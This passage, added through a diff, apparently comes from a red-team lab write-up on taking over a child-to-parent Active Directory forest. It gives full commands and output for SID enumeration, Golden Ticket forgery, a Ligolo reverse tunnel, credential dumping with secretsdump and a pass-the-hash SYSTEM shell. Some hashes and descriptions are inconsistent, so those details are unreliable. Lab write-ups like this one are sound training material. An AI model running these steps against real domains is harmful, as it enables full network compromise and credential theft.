@@ -534,4 +534,287 @@ krbtgt:des-cbc-md5:ba0b49b6b6455885
 
 ### 🧾 krbtgt SID Dump
 
+<p class="indent-paragraph">
+  With privileged SYSTEM access on the Child Domain Controller, the next step was to retrieve the domain SIDs for both the child and parent domains using Impacket’s <code>lookupsid.py</code>script. This step is essential for forging a <code>Golden Ticket</code> in the next phase of the attack, as we’ll need the
+  SID of the parent domain and the <code>RID</code> of the target account.
+</p>
+
+```
+~$ proxychains /root/.local/bin/lookupsid.py child/corpmngr:'User4&*&*'@child.warfare.corp
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Brute forcing SIDs at child.warfare.corp
+[*] StringBinding ncacn_np:child.warfare.corp[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-3754860944-83624914-1883974761
+
+~$ proxychains /root/.local/bin/lookupsid.py child/corpmngr:'User4&*&*'@warfare.corp
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Brute forcing SIDs at warfare.corp
+[*] StringBinding ncacn_np:warfare.corp[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-3375883379-808943238-3239386119
+```
+
+### 🎟 Golden Ticket Forgery
+
+<p class="indent-paragraph">
+  With all necessary artifacts in hand, a Golden Ticket was forged using Impacket’s<code>ticketer.py</code>script. This forged Kerberos ticket enables authentication as a highly privileged account in the parent domain without requiring the original user’s credentials. The following critical components were collected for ticket creation:
+</p>
+
+<div style="display: flex; justify-content: center; margin: 2em 0;">
+  <table style="border-collapse: collapse; border: 1px solid #444; min-width: 420px;">
+    <thead>
+      <tr>
+        <th style="border: 1px solid #555; padding: 8px 16px; text-align: center;">Component</th>
+        <th style="border: 1px solid #555; padding: 8px 16px; text-align: center;">Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td style="border: 1px solid #555; padding: 8px 16px;">krbtgt AES256</td>
+        <td style="border: 1px solid #555; padding: 8px 16px;">ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2</td>
+      </tr>
+      <tr>
+        <td style="border: 1px solid #555; padding: 8px 16px;">Child Domain SID</td>
+        <td style="border: 1px solid #555; padding: 8px 16px;">S-1-5-21-3754860944-83624914-1883974761</td>
+      </tr>
+      <tr>
+        <td style="border: 1px solid #555; padding: 8px 16px;">Parent Domain SID</td>
+        <td style="border: 1px solid #555; padding: 8px 16px;">S-1-5-21-3375883379-808943238-3239386119</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<p class="indent-paragraph">
+  The <code>ticketer.py</code> command leverages several options to forge a Golden Ticket for <code>corpmngr</code><span class="codefix">:</span> <code>-domain</code> sets the Kerberos realm<code>child.warfare.corp</code><span class="codefix">,</span> <code>-aesKey</code> provides the krbtgt AES256 key for ticket encryption, and <code>-domain-sid</code> specifies the domain’s Security Identifier. The <code>-groups</code> flag injects the primary group RID, <code>516</code> for Domain Users, and <code>-user-id</code> defines the user’s RID <code>1106</code><span class="codefix">.</span> <code>-extra-sid</code> appends two additional SIDs: the parent domain’s Domain Users SID (ending in <code>-516</code>) and the well-known <code>S-1-5-9</code> (Enterprise Domain Controllers), ensuring the ticket carries the necessary group memberships across both child and parent domains.
+</p>
+
+```
+~$ proxychains /root/.local/bin/ticketer.py -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Creating basic skeleton ticket and PAC Infos
+/root/.local/bin/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  aTime = timegm(datetime.datetime.utcnow().timetuple())
+
+[*] PAC_LOGON_INFO
+[*] PAC_CLIENT_INFO_TYPE
+[*] EncTicketPart
+[*] Signing/Encrypting final ticket
+[*] PAC_SERVER_CHECKSUM
+[*] PAC_PRIVSVR_CHECKSUM
+[*] EncTicketPart
+[*] EncASRepPart
+[*] Saving ticket in corpmngr.ccache
+```
+
+<p class="indent-paragraph">
+  Despite the deprecation warnings about using <code>datetime.utcnow()</code> (which recommend switching to timezone-aware objects), the <code>ticketer.py</code> script successfully generated a valid TGT for the <code>corpmngr</code> user that embeds both child and parent domain privileges. The final ticket was stored in <code>corpmngr.ccache</code>, confirming successful ticket creation.
+</p>
+
+### 📡 Launching the Ligolo Proxy
+
+<p class="indent-paragraph">
+  To synchronize the attacker’s system clock via NTP, full IP-level access to the internal subnet <code>192.168.98.0/24</code> was required. A Ligolo-ng pivot was deployed by creating and activating a TUN interface named <code>ligolo</code>, then routing the internal network range through it. This established an encrypted tunnel through the compromised host, allowing <code>ntpdate</code> to query the Domain Controller’s time.
+</p>
+
+```
+~$ sudo ip tuntap add user $(whoami) mode tun ligolo
+[sudo] password:
+
+~$ sudo ip route del 192.168.98.0/24 dev tun0
+
+~$ sudo ip link set ligolo up
+
+~$ sudo ip route add 192.168.98.0/24 dev ligolo
+
+~$ ip route
+default via 10.10.200.1 dev tun0 proto static metric 50
+10.10.200.0/24 dev tun0 proto kernel scope link src 10.10.200.106 metric 50
+192.168.80.0/24 via 10.10.200.1 dev tun0 proto static metric 50
+192.168.98.0/24 dev ligolo scope link linkdown
+```
+
+<p class="indent-paragraph">
+  Ligolo-ng was deployed on both ends to create an encrypted HTTP(s) tunnel. <strong>On the attacker host</strong>, the Ligolo server (proxy) was started with a self-signed certificate, listening on port 443:
+</p>
+
+```
+~$ ./proxy --selfcert --laddr 0.0.0.0:443
+WARN[0000] Using automatically generated self-signed certificates (Not recommended)
+
+INFO[0000] listening on 0.0.0.0:443
+
+       Ligolo-ng » INFO[0089] Agent joined. 
+       name=privilege@ubuntu-virtual-machine remote="192.168.80.10:34634"
+```
+<p class="indent-paragraph">
+  <strong>On the victim host</strong>, the Ligolo agent was launched to connect back to the attacker’s listener (ignoring the untrusted cert):
+</p>
+
+```
+~$ ./agent --connect 10.10.200.106:443 --ignore-cert
+
+WARN[0000] warning, certificate validation disabled
+INFO[0000] Connection established  addr="10.10.200.106:443"
+```
+
+<p class="indent-paragraph">
+  Once both sides were running, the <code>ligolo</code> interface carried full IP-level traffic—including UDP, ICMP, NTP, and TCP—through the compromised host, enabling all subsequent internal enumeration and time synchronization.
+</p>
+
+```
+~$ [Agent : privilege@ubuntu-virtual-machine] »  session
+? Specify a session : 1 - privilege@ubuntu-virtual-machine - 192.168.80.10:42010
+
+~$ [Agent : privilege@ubuntu-virtual-machine] » start
+INFO[10951] Starting tunnel to privilege@ubuntu-virtual-machine
+```
+
+### 🎫 Service Ticket Request via Kerberos Cache
+
+<p class="indent-paragraph">
+  <span class="red">Note:</span> Kerberos authentication will fail with <code>KRB_AP_ERR_SKEW</code> if the attacker’s clock drifts from the Domain Controller’s time. Because NTP relies on UDP, this requires a full-stack pivot (e.g. via Ligolo) before running <code>ntpdate</code><span class="codefix">.</span> The script below automates time synchronization by querying the DC over the Ligolo tunnel and setting the local clock in UTC.
+</p>
+
+```
+~$ cat sync_time_from_dc.sh
+
+#!/bin/bash
+# Set the IP address of the Domain Controller
+DC_IP="192.168.98.2"
+
+echo "[*] Querying current time from Domain Controller ($DC_IP)..."
+dc_time=$(ntpdate -q "$DC_IP" | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')
+
+if [ -z "$dc_time" ]; then
+  echo "[-] Failed to retrieve time from Domain Controller."
+  exit 1
+fi
+
+echo "[+] DC time retrieved: $dc_time UTC"
+echo "[*] Setting local system time to match DC..."
+# Update the system clock (UTC)
+sudo date -u -s "$dc_time"
+
+echo "[+] Local time successfully synchronized with DC."
+
+~$ ./sync_time_from_dc.sh
+[*] Querying current time from Domain Controller (192.168.98.2) ...
+[+] DC time retrieved: 2025-05-03 20:26:04 UTC
+[*] Setting local system time to match DC ...
+Sat May  3 20:26:04 UTC 2025
+[+] Local time successfully synchronized with DC.
+```
+
+<p class="indent-paragraph">
+  After loading the forged Golden Ticket into the Kerberos cache:
+  </p>
+
+```
+~$ export KRB5CCNAME=corpmngr.ccache
+```
+
+<p class="indent-paragraph">
+A Service Ticket for the CIFS SPN on the parent DC was requested. Impacket’s <code>getST.py</code> was invoked to obtain the TGS for <code>CIFS/child.warfare.corp</code>, connecting to both the child and parent KDCs and saving the resulting ticket to a new cache file.
+</p>
+
+```
+~$ proxychains /root/.local/bin/getST.py -spn 'CIFS/dc01.warfare.corp' child.warfare.corp/corpmngr -debug -k -no-pass
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket
+[+] Using Kerberos Cache: corpmngr.ccache
+[*] Returning cached credential for KRBTGT/CHILD.WARFARE.CORP@CHILD.WARFARE.CORP
+[*] Using TGT from cache
+[+] Username retrieved from CCache: corpmngr
+[*] Getting ST for user
+[+] Trying to connect to KDC at CHILD.WARFARE.CORP:88
+[*] Trying to connect to KDC at WARFARE.CORP:88
+[*] Saving ticket in corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
+```
+### 🛡️ Dumping Administrator Credentials
+
+<p class="indent-paragraph">
+  With a valid <code>Service Ticket (CIFS)</code> issued for the parent domain controller <code>dc01.warfare.corp</code> using the forged TGT for the user corpmngr, we proceed to extract credentials from the target system. This technique leverages the privileges embedded in the Golden Ticket. First, we export the <code>.ccache</code> file generated by the <code>getST.py</code> script to ensure Impacket tools correctly reference the Kerberos authentication context:
+</p>
+
+```
+~$ export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
+```
+
+<p class="indent-paragraph">
+  Then, using <code>secretsdump.py</code> with Kerberos authentication flags, we connect to the target domain controller and extract sensitive information, including the <code>NTLM hashes</code> of domain users.
+</p>
+
+```
+~$ proxychains /root/.local/bin/secretdump.py -k -no-pass dc01.warfare.corp \
+    -just-dc-user 'warfare\Administrator' -debug
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket
+[+] Using Kerberos Cache: corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
+[*] Domain retrieved from CCache: CHILD.WARFARE.CORP
+[*] Returning cached credential for CIFS/DC01.WARFARE.CORP@WARFARE.CORP
+[*] Using TGS from cache
+[*] Calling DRSUAPI method to get NTDS.DIT secrets
+[+] Calling DRScrackNames for warfare\Administrator
+[+] Calling DRSGetNCChanges for {17446816-c072-445e-ac9b-c0e28630bed6}
+[*] Entering NTDSHashes.__decryptHash
+[*] Decrypting hash for user: CN=Administrator,CN=Users,DC=warfare,DC=corp
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcdfd60:::
+[*] Leaving NTDSHashes.__decryptHash
+[*] Entering NTDSHashes.__decryptSupplementalInfo
+[*] Leaving NTDSHashes.__decryptSupplementalInfo
+[*] Finished processing and printing user's hashes, now printing supplemental information
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:ca1d92ce23064e3c43c08f9a5aff06f8fe002c10ab1031da11152611b2
+Administrator:aes128-cts-hmac-sha1-96:33d3f5778fade9945053a05ce2f18445
+Administrator:des-cbc-md5:3ba88a586240f423
+[*] Cleaning up ...
+```
+
+<p class="indent-paragraph">
+  Upon execution, the tool dumps the contents of the Security Account Manager (SAM) database and LSA secrets, including the NTLM hash of the <code>Administrator account</code> in the parent domain.
+</p>
+
+### 🎯 SYSTEM Shell on Domain Controller
+
+<p class="indent-paragraph">
+  With SYSTEM-level shell on the Domain Controller (dc01), complete control over the parent domain environment was achieved. From here, full Active Directory compromise is possible—creating backdoor accounts, extracting additional secrets, or deploying persistent agents. This level of access represents the pinnacle of the engagement, validating the end-to-end Red Team objective: identify and exploit vulnerabilities to demonstrate the impact of an AD takeover.
+</p>
+
+```
+~$ proxychains /root/.local/bin/psexec.py -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket
+[+] StringBinding ncacn_np:dc01.warfare.corp[\pipe\svcctl]
+[*] Requesting shares on dc01.warfare.corp.....
+[*] Found writable share ADMIN$
+[*] Uploading file FGxzltgq.exe
+[*] Opening SVCManager on dc01.warfare.corp.....
+[*] Creating service NLai on dc01.warfare.corp.....
+[*] Starting service NLai.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> hostname
+dc01
+
+C:\Windows\system32> ipconfig
+
+Windows IP Configuration
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.98.2
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.98.1
+```
+
 </div>
